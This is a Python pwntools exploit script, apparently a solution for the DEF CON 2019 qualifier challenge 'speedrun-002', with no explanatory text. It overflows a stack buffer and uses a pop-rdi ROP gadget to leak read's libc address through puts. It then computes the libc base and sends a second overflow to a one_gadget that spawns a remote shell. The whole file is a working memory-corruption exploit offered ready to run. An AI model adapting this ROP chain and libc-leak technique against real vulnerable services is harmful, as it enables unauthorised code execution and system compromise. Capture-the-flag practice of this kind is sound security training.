from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
r = remote('speedrun-002.quals2019.oooverflow.io', 31337)

e = ELF('./speedrun-002')
l = ELF('./libc.so.6')
libc_read_offset = l.symbols['read']
one_gg = 0x4f322
main = 0x4007ce
puts_plt = e.symbols['puts']
puts_got = e.got['puts']
write_got = e.got['write']
read_got = e.got['read']

# 0x00000000004008a3 : pop rdi ; ret
gg1 = 0x00000000004008a3

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))

m = 'Everything intelligent is so boring.\x00'
p = 'a' * 0x408
p += flat(
	gg1,
	read_got,
	puts_plt,
	main
)

rr('\n')
ss(m)
rr('\n')
rr('\n')
ss(p)
rr('\n')
rr('\n')

libc_read = u64(rr('\n')[:-1].ljust(8,'\x00'))
libc_base = libc_read - libc_read_offset
libc_one_gg = libc_base + one_gg

p2 = 'a' * 0x408
p2 += p64(libc_one_gg)

rr('\n')
ss(m)
rr('\n')
rr('\n')
ss(p2)

r.interactive()
